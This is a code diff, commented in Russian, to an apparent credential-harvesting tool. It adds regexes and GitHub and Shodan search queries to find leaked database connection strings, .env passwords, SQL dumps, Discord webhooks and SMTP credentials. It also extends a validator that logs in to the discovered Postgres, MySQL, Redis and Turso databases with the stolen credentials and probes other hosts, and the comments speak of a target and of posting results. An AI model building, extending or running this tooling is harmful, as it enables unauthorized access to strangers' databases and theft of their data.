@@ -700,7 +700,19 @@ KEY_PATTERNS = [
     # postgres://user:pass@host/db — 487 таких в TG-экспортах, валидируются логином
     (
         "db-dsn",
-        r"(?:postgres|postgresql|mysql)://[A-Za-z0-9_%\-.]+:[^@\s\"'<>]{4,}@[A-Za-z0-9.\-]+(?::\d{2,5})?/[A-Za-z0-9_%\-.]+",
+        # postgres(+driver)/mysql(+driver)/mongodb(+srv)/redis(s)/libsql(turso)/
+        # pscale(planetscale)/amqp(rabbit). юзер может быть пустым (redis://:pw@),
+        # /db — опционально (redis/amqp). pscale:// и libsql:// — managed-таргеты.
+        r"(?:postgres(?:ql)?(?:\+\w+)?|mysql(?:\+\w+)?|mongodb(?:\+srv)?|rediss?|"
+        r"pscale|amqps?)://"
+        r"[A-Za-z0-9_%\-.]*:[^@\s\"'<>]{3,}@[A-Za-z0-9.\-]+(?::\d{2,5})?(?:/[A-Za-z0-9_%\-.]*)?",
+        [],
+        False,
+    ),
+    # turso: libsql://host?authToken=... (кред в query, не в userinfo)
+    (
+        "db-dsn",
+        r"libsql://[A-Za-z0-9.\-]+\?authToken=[A-Za-z0-9_\-]{8,}",
         [],
         False,
     ),
@@ -1487,6 +1499,24 @@ class GitHubCode(Source):
             '"SMTP_PASSWORD" path:.env',
             '"smtp.gmail.com" "password" extension:env',
             '"MAILER_DSN" extension:env',
+            # 🗄️ ДАМП-ВОЛНА волна-2: mongo/redis/prisma/pscale/turso + sql-дампы
+            '"mongodb+srv://" extension:env',
+            '"mongodb://" extension:env',
+            '"rediss://" extension:env',
+            '"redis://" extension:env',
+            '"mysql+pymysql://"',
+            '"postgresql+psycopg2://"',
+            '"MYSQL_ROOT_PASSWORD" extension:env',
+            '"POSTGRES_PASSWORD" extension:env',
+            '"MONGO_INITDB_ROOT_PASSWORD" extension:env',
+            '"pooled.db.prisma.io"',
+            '"aws.connect.psdb.cloud"',
+            '"libsql://" extension:env',
+            '"amqp://" extension:env',
+            '"-- MySQL dump" extension:sql',
+            '"-- PostgreSQL database dump" extension:sql',
+            '"EMAIL_HOST_PASSWORD" extension:env',
+            '"discord.com/api/webhooks/" extension:env',
             # 🔑 BASETEN: 8.32 ключи + trussrc (конфиг truss CLI = baseten-ключ)
             '"BASETEN_API_KEY"',
             "baseten path:.env",
@@ -2690,6 +2720,36 @@ class Shodan(Source):
         ('http.html:"DATABASE_URL"', 4),  # жирнее: полный env-дамп
         # 🔑 BASETEN: 8.32 ключи на страницах
         ('http.html:"baseten"', 2),
+        # ============ 🗄️ ДАМП-ВОЛНА (ZOLTRAAK-таргет): DSN всех движков ============
+        ('http.html:"mongodb+srv://"', 3),  # mongo Atlas DSN с кредами
+        ('http.html:"mongodb://"', 2),
+        ('http.html:"rediss://"', 2),  # TLS-redis (upstash и ко)
+        ('http.html:"redis://default:"', 3),  # managed redis с юзером default
+        ('http.html:"mysql+pymysql://"', 2),
+        ('http.html:"postgresql+psycopg2://"', 2),
+        ('http.html:"libsql://"', 1),  # turso
+        ('http.html:"aws.connect.psdb.cloud"', 2),  # planetscale
+        ('http.html:"pooled.db.prisma.io"', 2),  # prisma pooler
+        ('http.html:"postgres.vercel-storage.com"', 2),  # vercel pg
+        ('http.html:"aivencloud.com" "postgresql://"', 1),  # aiven
+        ('http.html:"MYSQL_ROOT_PASSWORD"', 2),
+        ('http.html:"POSTGRES_PASSWORD"', 2),
+        ('http.html:"MONGO_INITDB_ROOT_PASSWORD"', 1),
+        ('http.html:"amqp://"', 1),  # rabbitmq
+        # ============ САМИ ДАМПЫ: sql-файлы на открытых хостах ============
+        ('http.html:"-- MySQL dump"', 3),  # mysqldump header = полный дамп БД
+        ('http.html:"-- PostgreSQL database dump"', 3),  # pg_dump header
+        ('http.html:"Dumping data for table"', 2),  # mysqldump body
+        ('http.title:"Index of /" ".sql"', 2),  # листинги с sql-дампами
+        ('http.title:"Index of /" "dump"', 2),
+        ('http.title:"Index of /" "backup"', 1),
+        # ============ вебхуки/почта/карго ============
+        ('http.html:"discord.com/api/webhooks/"', 2),  # discord вебхуки
+        ('http.html:"smtp.resend.com"', 1),
+        ('http.html:"smtp.qq.com"', 1),
+        ('http.html:"smtp.163.com"', 1),
+        ('http.html:"MAIL_PASSWORD"', 2),
+        ('http.html:"EMAIL_HOST_PASSWORD"', 2),
     ]
 
     def _key_pool(self):
@@ -8616,12 +8676,31 @@ def validate_db_dsn(dsn, origin):
         "admin",
     ):
         return None
-    scheme = "mysql" if dsn.startswith("mysql://") else "postgres"
+    # нормализация схемы: mysql+pymysql:// ≠ mysql:// (раньше улетал в
+    # postgres-ветку и молча умирал). postgresql+psycopg2 — режем "+driver"
+    # перед psycopg2.connect, libpq суффиксы не понимает.
+    scheme_m = re.match(r"([a-z0-9]+)", dsn)
+    scheme_raw = (scheme_m.group(1) if scheme_m else "").lower()
+    if scheme_raw.startswith("postgres"):
+        scheme = "postgres"
+    elif scheme_raw.startswith("mysql"):
+        scheme = "mysql"
+    elif scheme_raw == "pscale":
+        scheme = "mysql"  # planetscale = MySQL-совместимый (TLS обязателен)
+    elif scheme_raw in ("redis", "rediss"):
+        scheme = "redis"
+    elif scheme_raw == "libsql":
+        scheme = "libsql"  # turso: HTTP pipeline API с Bearer authToken
+    elif scheme_raw.startswith("mongodb"):
+        scheme = "tcp"  # wire-протокол без драйвера не проверить — TCP-проба
+    else:
+        scheme = "tcp"  # amqp и ко: как минимум живость хоста
     try:
         if scheme == "postgres":
             import psycopg2
 
-            conn = psycopg2.connect(dsn, connect_timeout=6)
+            dsn_pg = re.sub(r"^(postgres(?:ql)?)(?:\+\w+)?://", r"\1://", dsn)
+            conn = psycopg2.connect(dsn_pg, connect_timeout=6)
             conn.set_session(readonly=True, autocommit=True)
             cur = conn.cursor()
             cur.execute(
@@ -8630,7 +8709,7 @@ def validate_db_dsn(dsn, origin):
                 "WHERE table_schema NOT IN ('pg_catalog','information_schema'))"
             )
             u, db, ntab = cur.fetchone()
-        else:
+        elif scheme == "mysql":
             try:
                 import pymysql
             except ImportError:
@@ -8638,6 +8717,9 @@ def validate_db_dsn(dsn, origin):
             from urllib.parse import urlsplit
 
             uo = urlsplit(dsn)
+            _kw = {}
+            if scheme_raw == "pscale":
+                _kw["ssl"] = {"check_hostname": False}  # planetscale: TLS only
             conn = pymysql.connect(
                 host=uo.hostname,
                 port=uo.port or 3306,
@@ -8645,12 +8727,106 @@ def validate_db_dsn(dsn, origin):
                 password=uo.password or "",
                 database=(uo.path or "/").lstrip("/"),
                 connect_timeout=6,
+                **_kw,
             )
             cur = conn.cursor()
             cur.execute("SELECT CURRENT_USER(), DATABASE()")
             u, db = cur.fetchone()
             ntab = -1
-        conn.close()
+        elif scheme == "libsql":
+            # turso: HTTP pipeline API. authToken из query — живой = SELECT 1.
+            from urllib.parse import urlsplit, parse_qs
+
+            uo = urlsplit(dsn)
+            tok = (parse_qs(uo.query).get("authToken") or [""])[0]
+            if not tok or not uo.hostname:
+                return None
+            r = requests.post(
+                "https://%s/v2/pipeline" % uo.hostname,
+                headers={"Authorization": "Bearer " + tok},
+                json={
+                    "requests": [
+                        {"type": "execute", "stmt": {"sql": "SELECT 1"}},
+                        {"type": "close"},
+                    ]
+                },
+                timeout=(6, 12),
+                verify=False,
+            )
+            if r.status_code != 200:
+                return None
+            u, db, ntab = "turso", uo.hostname, -1
+        elif scheme == "redis":
+            # RESP AUTH+PING голым сокетом — драйвер не нужен (rediss = TLS).
+            import socket as _sock
+            import ssl as _ssl
+            from urllib.parse import urlsplit, unquote
+
+            uo = urlsplit(dsn)
+            pw_r = unquote(uo.password or "")
+            user_r = unquote(uo.username or "") or "default"
+            raw = _sock.create_connection((uo.hostname, uo.port or 6379), timeout=6)
+            if scheme_raw == "rediss":
+                ctx = _ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = _ssl.CERT_NONE
+                raw = ctx.wrap_socket(raw, server_hostname=uo.hostname)
+            if user_r and user_r != "default":
+                cmd = "*3\r\n$4\r\nAUTH\r\n$%d\r\n%s\r\n$%d\r\n%s\r\n" % (
+                    len(user_r),
+                    user_r,
+                    len(pw_r),
+                    pw_r,
+                )
+            else:
+                cmd = "*2\r\n$4\r\nAUTH\r\n$%d\r\n%s\r\n" % (len(pw_r), pw_r)
+            raw.sendall(cmd.encode())
+            resp = raw.recv(256)
+            if not resp.startswith(b"+OK"):
+                raw.close()
+                return None
+            raw.sendall(b"*1\r\n$4\r\nPING\r\n")
+            pong = raw.recv(64)
+            raw.close()
+            if b"PONG" not in pong:
+                return None
+            u, db, ntab = user_r, (uo.path or "/0").lstrip("/"), -1
+        else:
+            # TCP-проба: порт жив — DSN стоит поста (креды без драйвера
+            # не подтвердить; 🟡-честность вместо молчаливого дропа).
+            import socket as _sock
+            from urllib.parse import urlsplit
+
+            uo = urlsplit(dsn)
+            dport = {
+                "mongodb": 27017,
+                "pscale": 3306,
+                "amqp": 5672,
+                "amqps": 5671,
+                "libsql": 443,
+            }.get(scheme_raw, 443)
+            s = _sock.create_connection((uo.hostname, uo.port or dport), timeout=6)
+            s.close()
+            return {
+                "key": dsn,
+                "base": host,
+                "tag": "db-dsn",
+                "origin": str(origin)[:200],
+                "ts": time.time(),
+                "models": [],
+                "n_models": 0,
+                "stars_listed": [],
+                "stars_working": [],
+                "balance": None,
+                "tier": "%s HOST ALIVE %s:%s (креды не проверены)"
+                % (scheme_raw.upper(), host, uo.port or dport),
+                "usage": None,
+                "embed": None,
+                "rerank": None,
+                "status": "listed_only",
+            }
+        if scheme in ("postgres", "mysql"):
+            conn.close()
         return {
             "key": dsn,
             "base": host,
